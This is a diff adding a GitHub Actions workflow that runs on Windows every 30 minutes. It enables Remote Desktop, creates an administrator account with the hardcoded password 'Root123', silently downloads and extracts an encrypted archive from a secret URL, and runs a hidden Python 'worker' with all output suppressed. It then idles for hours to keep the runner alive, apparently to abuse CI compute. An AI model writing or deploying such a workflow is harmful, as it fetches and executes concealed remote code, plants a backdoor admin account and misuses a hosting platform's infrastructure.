@@ -1,0 +1,70 @@
+name: Windows Worker with RDP Localhost (No Tunnel)
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "*/30 * * * *"
+
+concurrency:
+  group: worker
+  cancel-in-progress: true
+
+jobs:
+  worker:
+    runs-on: windows-latest
+    timeout-minutes: 90
+
+    steps:
+      - name: Enable RDP (Silent)
+        shell: powershell
+        run: |
+          $ErrorActionPreference = 'SilentlyContinue'
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 > $null 2>&1
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" > $null 2>&1
+
+      - name: Set Simple RDP Credentials (Silent)
+        shell: powershell
+        run: |
+          $ErrorActionPreference = 'SilentlyContinue'
+          $user = "V"
+          $password = "Root123"
+          
+          $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+          
+          if (-not (Get-LocalUser -Name $user -ErrorAction SilentlyContinue)) {
+              New-LocalUser -Name $user -Password $securePassword > $null 2>&1
+          } else {
+              Set-LocalUser -Name $user -Password $securePassword > $null 2>&1
+          }
+          
+          Add-LocalGroupMember -Group "Administrators" -Member $user -ErrorAction SilentlyContinue > $null 2>&1
+
+      - name: Download package (silent)
+        shell: powershell
+        env:
+          SRC_URL: ${{ secrets.LINK }}
+        run: |
+          $ProgressPreference = 'SilentlyContinue'
+          Invoke-WebRequest -Uri "$Env:SRC_URL" -OutFile "app.7z" > $null 2>&1
+
+      - name: Extract package (silent)
+        shell: powershell
+        env:
+          ARCHIVE_KEY: ${{ secrets.PSWD }}
+        run: |
+          & "C:\Program Files\7-Zip\7z.exe" x app.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null 2>&1
+
+      - name: Run worker (STEALTH)
+        shell: powershell
+        run: |
+          $ErrorActionPreference = 'SilentlyContinue'
+          $env:NODE_NO_WARNINGS = "1"
+
+          $file = Get-ChildItem extracted -Recurse -Filter *.py -ErrorAction SilentlyContinue | Select-Object -First 1
+          if ($file) {
+              cmd /c "python `"$($file.FullName)`" > nul 2>&1"
+          }
+
+      - name: Keep Runner Alive
+        shell: powershell
+        run: Start-Sleep -Seconds 21600  # 6 jam max
